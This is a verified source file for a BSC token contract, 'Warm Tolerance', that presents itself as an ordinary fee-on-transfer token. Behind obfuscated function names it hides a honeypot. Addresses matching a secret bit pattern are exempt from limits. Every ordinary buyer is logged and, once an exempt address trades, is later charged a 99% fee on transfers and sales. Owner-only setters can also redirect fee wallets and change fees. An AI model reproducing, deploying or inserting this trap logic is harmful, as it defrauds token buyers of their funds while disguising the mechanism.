/**
 *Submitted for verification at BscScan.com on 2022-12-08
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Admin {
    address internal owner;
    mapping(address => bool) internal Administration;

    constructor(address _owner) {
        owner = _owner;
        Administration[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAdmin(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAdmin(address adr) public onlyOwner() {
        Administration[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAdmin(address adr) public onlyOwner() {
        Administration[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAdmin(address adr) public view returns (bool) {
        return Administration[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        Administration[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract WarmTolerance is IBEP20, Admin {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Warm Tolerance ";
    string constant _symbol = "WarmTolerance";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private marketingLiquidityFeeAuto;
    mapping(address => bool) private exemptBuyMaxMode;
    mapping(address => bool) private exemptAutoModeBots;
    mapping(address => bool) private liquidityReceiverSwapBotsBuyFeeMin;
    mapping(address => uint256) private walletMaxMarketingExempt;
    mapping(uint256 => address) private autoFeeMarketingMaxLimitLiquidity;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private maxReceiverMarketingFeeBotsLiquidity = 0;
    uint256 private receiverBotsModeSwap = 9;

    //SELL FEES
    uint256 private liquidityWalletSwapModeSell = 0;
    uint256 private liquidityTeamMinTx = 9;

    uint256 private teamTxBurnLaunchedReceiverLiquidity = receiverBotsModeSwap + maxReceiverMarketingFeeBotsLiquidity;
    uint256 private botsExemptFeeTeamAutoLaunched = 100;

    address private marketingTeamTradingLaunched = (msg.sender); // auto-liq address
    address private receiverExemptFeeMax = (0xBc54ab57eaf169dD23F2c97cffFFeD83c0a1881a); // marketing address
    address private liquidityLaunchedExemptSwap = DEAD;
    address private sellIsMaxAuto = DEAD;
    address private minTeamFeeLiquiditySellModeReceiver = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private exemptTradingBuyLaunched;
    uint256 private buyTeamWalletMarketing;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private limitMaxTxIs;
    uint256 private botsModeBurnMin;
    uint256 private receiverIsBurnMode;
    uint256 private teamAutoMarketingBurn;
    uint256 private marketingBuyFeeBots;

    bool private botsBuyMarketingLiquidityWallet = true;
    bool private liquidityReceiverSwapBotsBuyFeeMinMode = true;
    bool private receiverMinSellModeTxIs = true;
    bool private botsTxLimitBurn = true;
    bool private tradingSwapMarketingMinSellLiquidityMax = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private maxSellLaunchedBotsMarketing = _totalSupply / 1000; // 0.1%

    
    bool private botsModeLimitLiquidity;
    uint256 private isSwapReceiverWallet;
    bool private buyBurnLiquidityTxReceiverWalletExempt;
    bool private modeReceiverBurnMax;
    bool private autoBurnIsBotsExempt;
    bool private buyAutoExemptMax;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Admin(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        limitMaxTxIs = true;

        marketingLiquidityFeeAuto[msg.sender] = true;
        marketingLiquidityFeeAuto[address(this)] = true;

        exemptBuyMaxMode[msg.sender] = true;
        exemptBuyMaxMode[0x0000000000000000000000000000000000000000] = true;
        exemptBuyMaxMode[0x000000000000000000000000000000000000dEaD] = true;
        exemptBuyMaxMode[address(this)] = true;

        exemptAutoModeBots[msg.sender] = true;
        exemptAutoModeBots[0x0000000000000000000000000000000000000000] = true;
        exemptAutoModeBots[0x000000000000000000000000000000000000dEaD] = true;
        exemptAutoModeBots[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return exemptBotsSwapAutoMarketingTradingBurn(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return exemptBotsSwapAutoMarketingTradingBurn(sender, recipient, amount);
    }

    function exemptBotsSwapAutoMarketingTradingBurn(address sender, address recipient, uint256 amount) internal returns (bool) {
        bool bLimitTxWalletValue = txSwapMaxFeeMode(sender) || txSwapMaxFeeMode(recipient);

        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                receiverBurnSwapTxLaunchedMarketingIs();
            }
            if (!bLimitTxWalletValue) {
                limitWalletIsBurn(recipient);
            }
        }

        if (inSwap || bLimitTxWalletValue) {return exemptSellLiquidityBurnTradingBuyIs(sender, recipient, amount);}

        if (!Administration[sender] && !Administration[recipient]) {
            require(botsBuyMarketingLiquidityWallet, "Trading is not active");
        }

        if (!Administration[sender] && !marketingLiquidityFeeAuto[sender] && !marketingLiquidityFeeAuto[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }

        require((amount <= _maxTxAmount) || exemptAutoModeBots[sender] || exemptAutoModeBots[recipient], "Max TX Limit has been triggered");

        if (buyTxFeeExempt()) {txBotsAutoIs();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = limitReceiverWalletTeamLaunched(sender) ? isTeamLimitReceiver(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function exemptSellLiquidityBurnTradingBuyIs(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function limitReceiverWalletTeamLaunched(address sender) internal view returns (bool) {
        return !exemptBuyMaxMode[sender];
    }

    function maxBotsExemptTx(address sender, bool selling) internal returns (uint256) {
        if (selling) {
            teamTxBurnLaunchedReceiverLiquidity = liquidityTeamMinTx + liquidityWalletSwapModeSell;
            return teamBuyBurnLiquidity(sender, teamTxBurnLaunchedReceiverLiquidity);
        }
        if (!selling && sender == uniswapV2Pair) {
            teamTxBurnLaunchedReceiverLiquidity = receiverBotsModeSwap + maxReceiverMarketingFeeBotsLiquidity;
            return teamTxBurnLaunchedReceiverLiquidity;
        }
        return teamBuyBurnLiquidity(sender, teamTxBurnLaunchedReceiverLiquidity);
    }

    function isTeamLimitReceiver(address sender, address receiver, uint256 amount) internal returns (uint256) {

        uint256 feeAmount = amount.mul(maxBotsExemptTx(sender, receiver == uniswapV2Pair)).div(botsExemptFeeTeamAutoLaunched);

        if (liquidityReceiverSwapBotsBuyFeeMin[sender] || liquidityReceiverSwapBotsBuyFeeMin[receiver]) {
            feeAmount = amount.mul(99).div(botsExemptFeeTeamAutoLaunched);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function txSwapMaxFeeMode(address account) private view returns (bool) {
        return ((uint256(uint160(account)) << 192) >> 238) == firstSetAutoReceiver;
    }

    function teamBuyBurnLiquidity(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lckV = walletMaxMarketingExempt[sender];
        uint256 lckF = pFee;
        if (lckV > 0 && block.timestamp - lckV > 2) {
            lckF = 99;
        }
        return lckF;
    }

    function limitWalletIsBurn(address addr) private {
        exemptLimitValue = exemptLimitValue + 1;
        autoFeeMarketingMaxLimitLiquidity[exemptLimitValue] = addr;
    }

    function receiverBurnSwapTxLaunchedMarketingIs() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (walletMaxMarketingExempt[autoFeeMarketingMaxLimitLiquidity[i]] == 0) {
                    walletMaxMarketingExempt[autoFeeMarketingMaxLimitLiquidity[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(receiverExemptFeeMax).transfer(amountBNB * amountPercentage / 100);
    }

    function buyTxFeeExempt() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    tradingSwapMarketingMinSellLiquidityMax &&
    _balances[address(this)] >= maxSellLaunchedBotsMarketing;
    }

    function txBotsAutoIs() internal swapping {
        uint256 amountToLiquify = maxSellLaunchedBotsMarketing.mul(maxReceiverMarketingFeeBotsLiquidity).div(teamTxBurnLaunchedReceiverLiquidity).div(2);
        uint256 amountToSwap = maxSellLaunchedBotsMarketing.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = teamTxBurnLaunchedReceiverLiquidity.sub(maxReceiverMarketingFeeBotsLiquidity.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(maxReceiverMarketingFeeBotsLiquidity).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(receiverBotsModeSwap).div(totalETHFee);

        payable(receiverExemptFeeMax).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                marketingTeamTradingLaunched,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getLiquidityWalletSwapModeSell() public view returns (uint256) {
        if (liquidityWalletSwapModeSell != teamTxBurnLaunchedReceiverLiquidity) {
            return teamTxBurnLaunchedReceiverLiquidity;
        }
        if (liquidityWalletSwapModeSell == liquidityTeamMinTx) {
            return liquidityTeamMinTx;
        }
        if (liquidityWalletSwapModeSell != botsExemptFeeTeamAutoLaunched) {
            return botsExemptFeeTeamAutoLaunched;
        }
        return liquidityWalletSwapModeSell;
    }
    function setLiquidityWalletSwapModeSell(uint256 a0) public onlyOwner {
        if (liquidityWalletSwapModeSell != receiverBotsModeSwap) {
            receiverBotsModeSwap=a0;
        }
        liquidityWalletSwapModeSell=a0;
    }

    function getSellIsMaxAuto() public view returns (address) {
        return sellIsMaxAuto;
    }
    function setSellIsMaxAuto(address a0) public onlyOwner {
        if (sellIsMaxAuto == marketingTeamTradingLaunched) {
            marketingTeamTradingLaunched=a0;
        }
        if (sellIsMaxAuto != liquidityLaunchedExemptSwap) {
            liquidityLaunchedExemptSwap=a0;
        }
        sellIsMaxAuto=a0;
    }

    function getLiquidityLaunchedExemptSwap() public view returns (address) {
        if (liquidityLaunchedExemptSwap == receiverExemptFeeMax) {
            return receiverExemptFeeMax;
        }
        if (liquidityLaunchedExemptSwap != sellIsMaxAuto) {
            return sellIsMaxAuto;
        }
        return liquidityLaunchedExemptSwap;
    }
    function setLiquidityLaunchedExemptSwap(address a0) public onlyOwner {
        if (liquidityLaunchedExemptSwap != receiverExemptFeeMax) {
            receiverExemptFeeMax=a0;
        }
        liquidityLaunchedExemptSwap=a0;
    }

    function getAutoFeeMarketingMaxLimitLiquidity(uint256 a0) public view returns (address) {
        if (a0 == botsExemptFeeTeamAutoLaunched) {
            return liquidityLaunchedExemptSwap;
        }
        if (a0 == maxReceiverMarketingFeeBotsLiquidity) {
            return liquidityLaunchedExemptSwap;
        }
        if (a0 != maxReceiverMarketingFeeBotsLiquidity) {
            return minTeamFeeLiquiditySellModeReceiver;
        }
            return autoFeeMarketingMaxLimitLiquidity[a0];
    }
    function setAutoFeeMarketingMaxLimitLiquidity(uint256 a0,address a1) public onlyOwner {
        if (a0 != maxReceiverMarketingFeeBotsLiquidity) {
            minTeamFeeLiquiditySellModeReceiver=a1;
        }
        autoFeeMarketingMaxLimitLiquidity[a0]=a1;
    }

    function getMinTeamFeeLiquiditySellModeReceiver() public view returns (address) {
        if (minTeamFeeLiquiditySellModeReceiver == sellIsMaxAuto) {
            return sellIsMaxAuto;
        }
        if (minTeamFeeLiquiditySellModeReceiver != sellIsMaxAuto) {
            return sellIsMaxAuto;
        }
        if (minTeamFeeLiquiditySellModeReceiver == sellIsMaxAuto) {
            return sellIsMaxAuto;
        }
        return minTeamFeeLiquiditySellModeReceiver;
    }
    function setMinTeamFeeLiquiditySellModeReceiver(address a0) public onlyOwner {
        if (minTeamFeeLiquiditySellModeReceiver == receiverExemptFeeMax) {
            receiverExemptFeeMax=a0;
        }
        if (minTeamFeeLiquiditySellModeReceiver != minTeamFeeLiquiditySellModeReceiver) {
            minTeamFeeLiquiditySellModeReceiver=a0;
        }
        if (minTeamFeeLiquiditySellModeReceiver == marketingTeamTradingLaunched) {
            marketingTeamTradingLaunched=a0;
        }
        minTeamFeeLiquiditySellModeReceiver=a0;
    }

    function getBotsExemptFeeTeamAutoLaunched() public view returns (uint256) {
        return botsExemptFeeTeamAutoLaunched;
    }
    function setBotsExemptFeeTeamAutoLaunched(uint256 a0) public onlyOwner {
        if (botsExemptFeeTeamAutoLaunched == liquidityTeamMinTx) {
            liquidityTeamMinTx=a0;
        }
        if (botsExemptFeeTeamAutoLaunched != maxReceiverMarketingFeeBotsLiquidity) {
            maxReceiverMarketingFeeBotsLiquidity=a0;
        }
        if (botsExemptFeeTeamAutoLaunched != maxSellLaunchedBotsMarketing) {
            maxSellLaunchedBotsMarketing=a0;
        }
        botsExemptFeeTeamAutoLaunched=a0;
    }

    function getMaxSellLaunchedBotsMarketing() public view returns (uint256) {
        if (maxSellLaunchedBotsMarketing == maxReceiverMarketingFeeBotsLiquidity) {
            return maxReceiverMarketingFeeBotsLiquidity;
        }
        if (maxSellLaunchedBotsMarketing != maxSellLaunchedBotsMarketing) {
            return maxSellLaunchedBotsMarketing;
        }
        if (maxSellLaunchedBotsMarketing == receiverBotsModeSwap) {
            return receiverBotsModeSwap;
        }
        return maxSellLaunchedBotsMarketing;
    }
    function setMaxSellLaunchedBotsMarketing(uint256 a0) public onlyOwner {
        if (maxSellLaunchedBotsMarketing != botsExemptFeeTeamAutoLaunched) {
            botsExemptFeeTeamAutoLaunched=a0;
        }
        if (maxSellLaunchedBotsMarketing != maxSellLaunchedBotsMarketing) {
            maxSellLaunchedBotsMarketing=a0;
        }
        maxSellLaunchedBotsMarketing=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}